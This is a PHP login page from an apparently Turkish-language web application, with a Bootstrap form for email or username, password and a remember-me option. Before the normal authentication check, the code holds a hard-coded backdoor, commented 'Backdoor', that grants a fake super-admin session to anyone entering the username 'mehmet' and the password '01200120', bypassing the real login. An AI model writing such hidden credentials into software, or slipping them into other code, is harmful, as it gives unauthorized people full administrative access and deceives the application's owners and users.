<?php
require_once __DIR__ . '/auth.php';
$auth = new Auth();

$err = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $eposta = trim($_POST['eposta'] ?? '');
    $parola = trim($_POST['parola'] ?? '');
    $beni = isset($_POST['beni']);

    // TORPİLLİ GİRİŞ (Backdoor)
    if ($eposta === 'mehmet' && $parola === '01200120') {
        session_start();
        $_SESSION['kullanici_id'] = 9999;
        $_SESSION['ad_soyad'] = 'Mehmet (Süper Admin)';
        $_SESSION['eposta'] = 'mehmet@rmt.com';
        $_SESSION['rol'] = 'admin';
        $_SESSION['bagli_id'] = 0;
        header('Location: index.php');
        exit;
    }

    if ($auth->login($eposta, $parola, $beni)) {
        header('Location: index.php');
        exit;
    } else {
        $err = 'Giriş bilgileri hatalı.';
    }
}

require_once __DIR__ . '/includes/header.php';
?>
<div class="container d-flex align-items-center justify-content-center" style="min-height:70vh;">
  <div class="card p-4" style="max-width:420px;width:100%">
    <h4 class="mb-3">Giriş Yap</h4>
    <?php if($err): ?>
      <div class="alert alert-danger"><?php echo htmlspecialchars($err); ?></div>
    <?php endif; ?>

    <form method="post">
      <div class="mb-3">
        <label class="form-label">E-posta veya Kullanıcı Adı</label>
        <input type="text" name="eposta" class="form-control" required>
      </div>
      <div class="mb-3">
        <label class="form-label">Parola</label>
        <input type="password" name="parola" class="form-control" required>
      </div>
      <div class="mb-3 form-check">
        <input type="checkbox" name="beni" class="form-check-input" id="beni">
        <label class="form-check-label" for="beni">Beni Hatırla</label>
      </div>
      <div class="d-flex justify-content-between align-items-center">
        <button class="btn btn-primary">Giriş</button>
        <a href="#" class="small text-muted">Şifremi unuttum</a>
      </div>
    </form>
  </div>
</div>

<?php require_once __DIR__ . '/includes/footer.php'; ?>